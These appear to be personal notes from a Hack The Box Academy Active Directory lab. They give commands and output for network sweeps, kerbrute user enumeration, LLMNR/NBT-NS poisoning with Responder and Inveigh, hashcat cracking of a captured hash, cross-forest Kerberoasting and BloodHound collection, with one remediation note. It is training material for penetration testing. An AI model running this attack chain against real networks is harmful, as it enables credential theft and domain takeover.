# [HTB] External Recon and Enumeration Principles
[viewdns](https://viewdns.info/)
[domaintools](https://whois.domaintools.com/)
[dehashed](https://github.com/mrb3n813/Pentest-stuff/blob/master/dehashed.py)

## Initial Enumeration of the Domain
```
┌─[htb-student@ea-attack01]─[~]
└──╼ $sudo -E wireshark

11:28:20.487     Main Warn QStandardPaths: runtime directory '/run/user/1001' is not owned by UID 0, but a directory permissions 0700 owned by UID 1001 GID 1002
<SNIP>
```
```
sudo tcpdump -i ens224 
```
```
sudo responder -I ens224 -A 
```
##### FPing Active Checks
```
[!bash!]$ fping -asgq 172.16.5.0/23

172.16.5.5
172.16.5.25
172.16.5.50
172.16.5.100
172.16.5.125
172.16.5.200
172.16.5.225
172.16.5.238
172.16.5.240

     510 targets
       9 alive
     501 unreachable
       0 unknown addresses

    2004 timeouts (waiting for response)
    2013 ICMP Echos sent
       9 ICMP Echo Replies received
    2004 other ICMP received

 0.029 ms (min round trip time)
 0.396 ms (avg round trip time)
 0.799 ms (max round trip time)
       15.366 sec (elapsed real time)
```
### nmap scan
```
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
Nmap scan report for inlanefreight.local (172.16.5.5)
Host is up (0.069s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: INLANEFREIGHT.LOCAL0., Site: Default-First-Site-Name)
|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
| Issuer: commonName=INLANEFREIGHT-CA
| Public Key type: rsa
| Public Key bits: 2048

htb$ nmap -A 172.16.5.100
```
##### Cloning Kerbrute GitHub Repo

```
[!bash!]$ sudo git clone https://github.com/ropnop/kerbrute.git

Cloning into 'kerbrute'...
remote: Enumerating objects: 845, done.
remote: Counting objects: 100% (47/47), done.
remote: Compressing objects: 100% (36/36), done.
remote: Total 845 (delta 18), reused 28 (delta 10), pack-reused 798
Receiving objects: 100% (845/845), 419.70 KiB | 2.72 MiB/s, done.
Resolving deltas: 100% (371/371), done.

[!bash!]$ make help

help:            Show this help.
windows:  Make Windows x86 and x64 Binaries
linux:  Make Linux x86 and x64 Binaries
mac:  Make Darwin (Mac) x86 and x64 Binaries
clean:  Delete any binaries
all:  Make Windows, Linux and Mac x86/x64 Binaries

[!bash!]$ sudo make all

go: downloading github.com/spf13/cobra v1.1.1
go: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7
go: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02
go: downloading github.com/spf13/pflag v1.0.5
go: downloading github.com/jcmturner/gofork v1.0.0
go: downloading github.com/hashicorp/go-uuid v1.0.2
go: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897
go: downloading github.com/jcmturner/rpc/v2 v2.0.2
go: downloading github.com/jcmturner/dnsutils/v2 v2.0.0
go: downloading github.com/jcmturner/aescts/v2 v2.0.0
go: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa
cd /tmp/kerbrute
rm -f kerbrute kerbrute.exe kerbrute kerbrute.exe kerbrute.test kerbrute.test.exe kerbrute.test kerbrute.test.exe main main.exe
rm -f /root/go/bin/kerbrute
Done.
Building for windows amd64..

<SNIP>
```
```
[!bash!]$ ls dist/

kerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe
```
```
[!bash!]$ ./kerbrute_linux_amd64 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]
  
  <SNIP>
```
#### Adding the Tool to our Path

```
[!bash!]$ echo $PATH
/home/htb-student/.local/bin:/snap/bin:/usr/sandbox/:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/htb-student/.dotnet/tools
```
```
Moving the Binary
[!bash!]$ sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```
```
Enumerating Users with Kerbrute
[!bash!]$ kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users

2021/11/17 23:01:46 >  Using KDC(s):
2021/11/17 23:01:46 >   172.16.5.5:88
2021/11/17 23:01:46 >  [+] VALID USERNAME:       jjones@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       sbrown@INLANEFREIGHT.LOCAL
2021/11/17 23:01:46 >  [+] VALID USERNAME:       tjohnson@INLANEFREIGHT.LOCAL
2021/11/17 23:01:50 >  [+] VALID USERNAME:       evalentin@INLANEFREIGHT.LOCAL

 <SNIP>
 
2021/11/17 23:01:51 >  [+] VALID USERNAME:       sgage@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jshay@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       jhermann@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       whouse@INLANEFREIGHT.LOCAL
2021/11/17 23:01:51 >  [+] VALID USERNAME:       emercer@INLANEFREIGHT.LOCAL
2021/11/17 23:01:52 >  [+] VALID USERNAME:       wshepherd@INLANEFREIGHT.LOCAL
2021/11/17 23:01:56 >  Done! Tested 48705 usernames (56 valid) in 9.940 seconds
```
### LLMNR/NBT-NS Poisoning - from Linux

```
Starting Responder with Default Settings
sudo responder -I ens224
```
```
[!bash!]$ hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80baa52d732719dbf62c34cc:010100000000000080f519d1432cd80136f3af14556f047800000000020008004900340046004e0001001e00570049004e002d0032004e004c005100420057004d00310054005000490004003400570049004e002d0032004e004c005100420057004d0031005400500049002e004900340046004e002e004c004f00430041004c00030014004900340046004e002e004c004f00430041004c00050014004900340046004e002e004c004f00430041004c000700080080f519d1432cd80106000400020000000800300030000000000000000000000000300000227f23c33f457eb40768939489f1d4f76e0e07a337ccfdd45a57d9b612691a800a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:Klmcargo2
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: FOREND::INLANEFREIGHT:4af70a79938ddf8a:0f85ad1e80ba...000000
Time.Started.....: Mon Feb 28 15:20:30 2022 (11 secs)
Time.Estimated...: Mon Feb 28 15:20:41 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1086.9 kH/s (2.64ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10967040/14344385 (76.46%)
Rejected.........: 0/10967040 (0.00%)
Restore.Point....: 10960896/14344385 (76.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
```
## LLMNR/NBT-NS Poisoning - from Windows
```
Using Inveigh

PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata
```
```
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-02-28T19:26:30
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.5.25
[+] Spoofer IP Address = 172.16.5.25
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer For Types 00,20 = Enabled
[+] NBNS TTL = 165 Seconds
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Certificate Issuer = Inveigh
[+] HTTPS Certificate CN = localhost
[+] HTTPS Capture = Enabled
[+] HTTP/HTTPS Authentication = NTLM
[+] WPAD Authentication = NTLM
[+] WPAD NTLM Authentication Ignore List = Firefox
[+] WPAD Response = Enabled
[+] Kerberos TGT Capture = Disabled
[+] Machine Account Capture = Disabled
[+] Console Output = Full
[+] File Output = Enabled
[+] Output Directory = C:\Tools
WARNING: [!] Run Stop-Inveigh to stop
[*] Press any key to stop console output
WARNING: [-] [2022-02-28T19:26:31] Error starting HTTP listener
WARNING: [!] [2022-02-28T19:26:31] Exception calling "Start" with "0" argument(s): "An attempt was made to access a
socket in a way forbidden by its access permissions" $HTTP_listener.Start()
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:31] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:32] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] mDNS(QM) request academy-ea-web0.local received from 172.16.5.125 [spoofer disabled]
[+] [2022-02-28T19:26:33] LLMNR request for academy-ea-web0 received from 172.16.5.125 [response sent]
[+] [2022-02-28T19:26:34] TCP(445) SYN packet detected from 172.16.5.125:56834
[+] [2022-02-28T19:26:34] SMB(445) negotiation request detected from 172.16.5.125:56834
```
```
PS C:\htb> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Listener Addresses [IP 0.0.0.0 | IPv6 ::]
[+] Spoofer Reply Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
[+] Spoofer Options [Repeat Enabled | Local Attacks Disabled]
[ ] DHCPv6
[+] DNS Packet Sniffer [Type A]
[ ] ICMPv6
[+] LLMNR Packet Sniffer [Type A]
[ ] MDNS
[ ] NBNS
[+] HTTP Listener [HTTPAuth NTLM | WPADAuth NTLM | Port 80]
[ ] HTTPS
[+] WebDAV [WebDAVAuth NTLM]
[ ] Proxy
[+] LDAP Listener [Port 389]
[+] SMB Packet Sniffer [Port 445]
[+] File Output [C:\Tools]
[+] Previous Session Files (Not Found)
[*] Press ESC to enter/exit interactive console
[!] Failed to start HTTP listener on port 80, check IP and port usage.
[!] Failed to start HTTPv6 listener on port 80, check IP and port usage.
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:31] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:31] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:31] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:31] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from 172.16.5.125 [disabled]
[ ] [20:03:32] mDNS(QM)(A) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[ ] [20:03:32] mDNS(QM)(AAAA) request [academy-ea-web0.local] from fe80::f098:4f63:8384:d1d0%8 [disabled]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[+] [20:03:32] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
```

```
After typing HELP and hitting enter, we are presented with several options:

  LLMNR/NBT-NS Poisoning - from Windows

=============================================== Inveigh Console Commands ===============================================

Command                           Description
========================================================================================================================
GET CONSOLE                     | get queued console output
GET DHCPv6Leases                | get DHCPv6 assigned IPv6 addresses
GET LOG                         | get log entries; add search string to filter results
GET NTLMV1                      | get captured NTLMv1 hashes; add search string to filter results
GET NTLMV2                      | get captured NTLMv2 hashes; add search string to filter results
GET NTLMV1UNIQUE                | get one captured NTLMv1 hash per user; add search string to filter results
GET NTLMV2UNIQUE                | get one captured NTLMv2 hash per user; add search string to filter results
GET NTLMV1USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv1 hashes
GET NTLMV2USERNAMES             | get usernames and source IPs/hostnames for captured NTLMv2 hashes
GET CLEARTEXT                   | get captured cleartext credentials
GET CLEARTEXTUNIQUE             | get unique captured cleartext credentials
GET REPLYTODOMAINS              | get ReplyToDomains parameter startup values
GET REPLYTOHOSTS                | get ReplyToHosts parameter startup values
GET REPLYTOIPS                  | get ReplyToIPs parameter startup values
GET REPLYTOMACS                 | get ReplyToMACs parameter startup values
GET IGNOREDOMAINS               | get IgnoreDomains parameter startup values
GET IGNOREHOSTS                 | get IgnoreHosts parameter startup values
GET IGNOREIPS                   | get IgnoreIPs parameter startup values
GET IGNOREMACS                  | get IgnoreMACs parameter startup values
SET CONSOLE                     | set Console parameter value
HISTORY                         | get command history
RESUME                          | resume real time console output
STOP                            | stop Inveigh
```
```
"NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening Network and Sharing Center under Control Panel, clicking on Change adapter settings, right-clicking on the adapter to view its properties, selecting Internet Protocol Version 4 (TCP/IPv4), and clicking the Properties button, then clicking on Advanced and selecting the WINS tab and finally selecting Disable NetBIOS over TCP/IP."

"While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:"

Code: powershell

$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```
## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows
```
Enumerating Accounts for Associated SPNs Using Get-DomainUser

PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

samaccountname
--------------
krbtgt
mssqlsvc
```
```
Enumerating the mssqlsvc Account

PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

samaccountname memberof
-------------- --------
mssqlsvc       CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
```
```
Performing a Kerberoasting Attacking with Rubeus Using /domain Flag

PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : mssqlsvc
[*] Target Domain          : FREIGHTLOGISTICS.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL/DC=FREIGHTLOGISTICS,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=mssqlsvc)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : mssqlsvc
[*] DistinguishedName      : CN=mssqlsvc,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL
[*] ServicePrincipalName   : MSSQLsvc/sql01.freightlogstics:1433
[*] PwdLastSet             : 3/24/2022 12:47:52 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$MSSQLsvc/sql01.freightlogstic
```
#### Admin Password Re-Use & Group Membership
```
Using Get-DomainForeignGroupMember

PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL

GroupDomain             : FREIGHTLOGISTICS.LOCAL
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
MemberDomain            : FREIGHTLOGISTICS.LOCAL
MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
                          TICS,DC=LOCAL

PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```
```
Accessing DC03 Using Enter-PSSession

PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```
## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux
```
Cross-Forest Kerberoasting
Using GetUserSPNs.py
 
mdmithu@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL 
```

```
Using the -request Flag

mdmithu@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               


$krb5tgs$23$*mssqlsvc$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/mssqlsvc*$10<SNIP>
```
```
Adding INLANEFREIGHT.LOCAL Information to /etc/resolv.conf

mdmithu@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain INLANEFREIGHT.LOCAL
nameserver 172.16.5.5
```
```
Running bloodhound-python Against INLANEFREIGHT.LOCAL

mdmithu@htb[/htb]$ bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 559 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01
INFO: Found 2950 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts

<SNIP
```

```
Compressing the File with zip -r

mdmithu@htb[/htb]$ zip -r ilfreight_bh.zip *.json

  adding: 20220329140127_computers.json (deflated 99%)
  adding: 20220329140127_domains.json (deflated 82%)
  adding: 20220329140127_groups.json (deflated 97%)
  adding: 20220329140127_users.json (deflated 98%)
```

```
Adding FREIGHTLOGISTICS.LOCAL Information to /etc/resolv.conf

mdmithu@htb[/htb]$ cat /etc/resolv.conf 

# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

#nameserver 1.1.1.1
#nameserver 8.8.8.8
domain FREIGHTLOGISTICS.LOCAL
nameserver 172.16.5.238
```
```
Running bloodhound-python Against FREIGHTLOGISTICS.LOCAL

mdmithu@htb[/htb]$ bloodhound-python -d FREIGHTLOGISTICS.LOCAL -dc ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -c All -u forend@inlanefreight.local -p Klmcargo2

INFO: Found AD domain: freightlogistics.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 5 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 9 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL
INFO: Found 52 groups
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
```
